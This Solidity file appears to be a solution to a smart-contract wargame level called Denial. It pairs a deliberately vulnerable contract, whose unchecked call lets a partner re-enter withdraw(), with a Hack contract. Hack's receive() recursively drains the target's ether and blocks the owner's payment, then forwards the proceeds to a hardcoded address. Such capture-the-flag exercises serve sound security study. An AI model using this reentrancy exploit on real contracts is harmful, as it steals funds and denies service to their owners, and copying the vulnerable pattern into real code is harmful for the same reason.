// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Hack {
    address payable target = payable(0xbC50E383AB39a02A57D19e4b5e71Da263411b894);
    Denial denial = Denial(target);
    function attack() public {
        denial.setWithdrawPartner(address(this));
        //denial.withdraw();
    }

    function withdraw() public payable {
        uint256 amountToSend = address(this).balance;
        payable(0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65).transfer(amountToSend);
    }

    receive() external payable {
        denial.withdraw();
    }
}